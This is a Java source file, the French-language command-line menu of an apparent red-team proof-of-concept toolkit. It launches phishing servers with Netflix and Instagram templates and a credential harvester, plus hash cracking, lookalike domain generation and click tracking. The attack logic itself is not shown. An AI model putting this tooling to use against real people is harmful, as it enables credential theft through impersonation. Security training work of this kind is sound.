package fr.redteam;

import fr.redteam.core.DefaultReport;
import fr.redteam.core.Module;
import fr.redteam.core.Report;
import fr.redteam.core.Target;
import fr.redteam.credential.HashCracker;
import fr.redteam.credential.PasswordStrengthAnalyzer;
import fr.redteam.output.ConsoleReporter;
import fr.redteam.output.Reporter;
import fr.redteam.phishing.HomographGenerator;
import fr.redteam.phishing.QrCodeGenerator;
import fr.redteam.recon.SubdomainTakeoverChecker;
import fr.redteam.util.Ansi;
import fr.redteam.web.CredentialHarvester;
import fr.redteam.web.PhishingHttpServer;
import fr.redteam.web.PhishingPageGenerator;
import fr.redteam.web.UrlShortener;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Scanner;


public class RedTeamCli {

    private static final String LOGO =
            "\n" +
            "RRRRRRRRRRRRRRRRR   EEEEEEEEEEEEEEEEEEEEEEDDDDDDDDDDDDD       TTTTTTTTTTTTTTTTTTTTTTT     OOOOOOOOO          OOOOOOOOO     LLLLLLLLLLL             \n" +
            "R::::::::::::::::R  E::::::::::::::::::::ED::::::::::::DDD    T:::::::::::::::::::::T   OO:::::::::OO      OO:::::::::OO   L:::::::::L             \n" +
            "R::::::RRRRRR:::::R E::::::::::::::::::::ED:::::::::::::::DD  T:::::::::::::::::::::T OO:::::::::::::OO  OO:::::::::::::OO L:::::::::L             \n" +
            "RR:::::R     R:::::REE::::::EEEEEEEEE::::EDDD:::::DDDDD:::::D T:::::TT:::::::TT:::::TO:::::::OOO:::::::OO:::::::OOO:::::::OLL:::::::LL             \n" +
            "  R::::R     R:::::R  E:::::E       EEEEEE  D:::::D    D:::::DTTTTTT  T:::::T  TTTTTTO::::::O   O::::::OO::::::O   O::::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E               D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::RRRRRR:::::R   E::::::EEEEEEEEEE     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R:::::::::::::RR    E:::::::::::::::E     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::RRRRRR:::::R   E:::::::::::::::E     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E::::::EEEEEEEEEE     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E               D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E       EEEEEE  D:::::D    D:::::D        T:::::T        O::::::O   O::::::OO::::::O   O::::::O  L:::::L         LLLLLL\n" +
            "RR:::::R     R:::::REE::::::EEEEEEEE:::::EDDD:::::DDDDD:::::D       TT:::::::TT      O:::::::OOO:::::::OO:::::::OOO:::::::OLL:::::::LLLLLLLLL:::::L\n" +
            "R::::::R     R:::::RE::::::::::::::::::::ED:::::::::::::::DD        T:::::::::T       OO:::::::::::::OO  OO:::::::::::::OO L::::::::::::::::::::::L\n" +
            "R::::::R     R:::::RE::::::::::::::::::::ED::::::::::::DDD          T:::::::::T         OO:::::::::OO      OO:::::::::OO   L::::::::::::::::::::::L\n" +
            "RRRRRRRR     RRRRRRREEEEEEEEEEEEEEEEEEEEEEDDDDDDDDDDDDD             TTTTTTTTTTT           OOOOOOOOO          OOOOOOOOO     LLLLLLLLLLLLLLLLLLLLLLLL\n" +
            "\n";

    private static final String SEP = "══════════════════════════════════════════════════════";
    private static final String SEP_THIN = "──────────────────────────────────────────────────────────";

    private final Map<String, Module> modules = new LinkedHashMap<>();
    private final Reporter reporter = new ConsoleReporter();

    public RedTeamCli() {
        register(new HashCracker());
        register(new CredentialHarvester());
        register(new QrCodeGenerator());
        register(new SubdomainTakeoverChecker());
        register(new UrlShortener());
        register(new PasswordStrengthAnalyzer());
        register(new HomographGenerator());
    }

    private void register(Module m) {
        modules.put(m.getName().toLowerCase(), m);
    }

    public void printLogo() {
        System.out.println(Ansi.RED + LOGO + Ansi.RESET);
        System.out.println(Ansi.BOLD + Ansi.CYAN + "  Offensive Security (PoC)" + Ansi.RESET);
        System.out.println();
    }

    public void run(String[] args) {
        printLogo();
        if (args.length > 0 && "list".equalsIgnoreCase(args[0])) {
            listModules();
            return;
        }
        if (args.length > 0 && "run".equalsIgnoreCase(args[0])) {
            String name = args.length > 1 ? args[1] : null;
            String host = args.length > 2 ? args[2] : "127.0.0.1";
            int port = args.length > 3 ? parseInt(args[3], -1) : -1;
            runModule(name, host, port);
            return;
        }
        runInteractive();
    }

    private void listModules() {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Modules disponibles"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        for (Module m : modules.values()) {
            System.out.println("  " + Ansi.green(m.getName()) + Ansi.dim(" - " + m.getDescription()));
        }
    }

    private void runModule(String name, String host, int port) {
        if (name == null || name.isEmpty()) {
            System.out.println("Usage: run <module_name> [host] [port]");
            listModules();
            return;
        }
        Module m = modules.get(name.toLowerCase());
        if (m == null) {
            System.out.println("Module inconnu: " + name);
            listModules();
            return;
        }
        Target target = new Target(host, port > 0 ? port : -1);
        Report report = new DefaultReport();
        m.run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Rapport " + m.getName()));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runInteractive() {
        try (Scanner scan = new Scanner(System.in)) {
            while (true) {
                System.out.println(Ansi.CYAN + "\n  " + SEP + Ansi.RESET);
                System.out.println(Ansi.bold("  MENU PRINCIPAL"));
                System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
                System.out.println("  " + Ansi.green("[1]") + " Démarrer serveur phishing " + Ansi.dim("(HTTP 127.0.0.1:8080)"));
                System.out.println("  " + Ansi.green("[2]") + " HashCracker " + Ansi.dim("(crack MD5/SHA1 par wordlist)"));
                System.out.println("  " + Ansi.green("[3]") + " QR Code Generator " + Ansi.dim("(génère QR vers URL)"));
                System.out.println("  " + Ansi.green("[4]") + " Subdomain Takeover " + Ansi.dim("(détecte vulnérabilités)"));
                System.out.println("  " + Ansi.green("[5]") + " URL Shortener " + Ansi.dim("(tracking des clics)"));
                System.out.println("  " + Ansi.green("[6]") + " Password Strength " + Ansi.dim("(analyse force)"));
                System.out.println("  " + Ansi.green("[7]") + " Homograph Generator " + Ansi.dim("(domaines lookalike)"));
                System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
                System.out.print("  " + Ansi.bold("Choix") + " › ");
                String line = scan.nextLine();
                if (line == null) break;
                line = line.trim();
                if ("1".equals(line)) { startPhishingServer(scan); continue; }
                if ("2".equals(line)) { runHashCracker(scan); continue; }
                if ("3".equals(line)) { runQrCodeGenerator(scan); continue; }
                if ("4".equals(line)) { runSubdomainTakeover(scan); continue; }
                if ("5".equals(line)) { startUrlShortener(scan); continue; }
                if ("6".equals(line)) { runPasswordStrength(scan); continue; }
                if ("7".equals(line)) { runHomographGenerator(scan); continue; }
                System.out.println(Ansi.red("  ✗ Choix invalide."));
            }
        }
    }

    private void runHashCracker(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  HashCracker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Hash MD5/SHA1 ou chemin fichier › ");
        String input = scan.nextLine();
        String hashOrPath = (input != null && !input.trim().isEmpty()) ? input.trim() : "";
        Target target = new Target(hashOrPath, -1);
        Report report = new DefaultReport();
        Module hashCracker = modules.get("hashcracker");
        hashCracker.run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Rapport HashCracker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void startPhishingServer(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Serveur Phishing"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.println("  Choisissez le template :");
        System.out.println("  " + Ansi.green("[1]") + " Netflix");
        System.out.println("  " + Ansi.green("[2]") + " Instagram");
        System.out.print("  Choix › ");
        String choice = scan.nextLine();
        if (choice != null) choice = choice.trim();
        String[] names = PhishingPageGenerator.TEMPLATE_NAMES;
        String template = null;
        int idx = parseInt(choice, 0);
        if (idx >= 1 && idx <= names.length) {
            template = names[idx - 1];
        }
        int port = 8080;
        String host = "127.0.0.1";
        try {
            PhishingHttpServer srv = new PhishingHttpServer(host, port, new PhishingPageGenerator(), new CredentialHarvester(), template);
            srv.start();
            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
            System.out.println(Ansi.bold("  ✓ Serveur démarré"));
            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
            System.out.println("  " + Ansi.cyan("URL") + "  › " + Ansi.bold("http://" + host + ":" + port));
            System.out.println("  " + Ansi.cyan("Template") + " › " + (template != null ? Ansi.green(template) : Ansi.yellow("choix via URL")));
            System.out.println(Ansi.dim("  Les identifiants s'afficheront ici."));
            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
            System.out.print(Ansi.dim("  [Entrée] pour revenir au menu › "));
            scan.nextLine();
        } catch (Exception e) {
            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
        }
    }

    private void runQrCodeGenerator(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  QR Code Generator"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  URL cible (ex. http://localhost:8080) › ");
        String url = scan.nextLine();
        if (url != null) url = url.trim();
        Target target = new Target(url != null ? url : "", -1);
        Report report = new DefaultReport();
        modules.get("qrcodegenerator").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runSubdomainTakeover(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Subdomain Takeover Checker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Domaine cible (ex. example.com) › ");
        String domain = scan.nextLine();
        if (domain != null) domain = domain.trim();
        Target target = new Target(domain != null ? domain : "", -1);
        Report report = new DefaultReport();
        modules.get("subdomaintakeoverchecker").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void startUrlShortener(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  URL Shortener"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  URL de destination (ex. http://localhost:8080) › ");
        String destUrl = scan.nextLine();
        if (destUrl == null || destUrl.trim().isEmpty()) {
            System.out.println(Ansi.red("  ✗ URL vide."));
            return;
        }
        destUrl = destUrl.trim();
        if (!destUrl.startsWith("http://") && !destUrl.startsWith("https://")) destUrl = "http://" + destUrl;
        int port = 9090;
        try {
            UrlShortener.startServer(port, destUrl);
            String shortUrl = UrlShortener.getShortUrl(port);
            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
            System.out.println(Ansi.bold("  ✓ Serveur démarré"));
            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
            System.out.println("  " + Ansi.cyan("URL courte") + " › " + Ansi.bold(shortUrl));
            System.out.println("  " + Ansi.cyan("Redirige vers") + " › " + destUrl);
            System.out.println(Ansi.dim("  Les clics s'afficheront ici."));
            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
            System.out.print(Ansi.dim("  [Entrée] pour revenir au menu › "));
            scan.nextLine();
            UrlShortener.stopServer();
        } catch (Exception e) {
            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
        }
    }

    private void runPasswordStrength(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Password Strength Analyzer"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Mot de passe à analyser › ");
        String password = scan.nextLine();
        if (password != null) password = password.trim();
        Target target = new Target(password != null ? password : "", -1);
        Report report = new DefaultReport();
        modules.get("passwordstrengthanalyzer").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runHomographGenerator(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Homograph Domain Generator"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Domaine cible (ex. google.com) › ");
        String domain = scan.nextLine();
        if (domain != null) domain = domain.trim();
        Target target = new Target(domain != null ? domain : "", -1);
        Report report = new DefaultReport();
        modules.get("homographgenerator").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private static int parseInt(String s, int def) {
        if (s == null || s.isEmpty()) return def;
        try {
            return Integer.parseInt(s);
        } catch (NumberFormatException e) {
            return def;
        }
    }
}
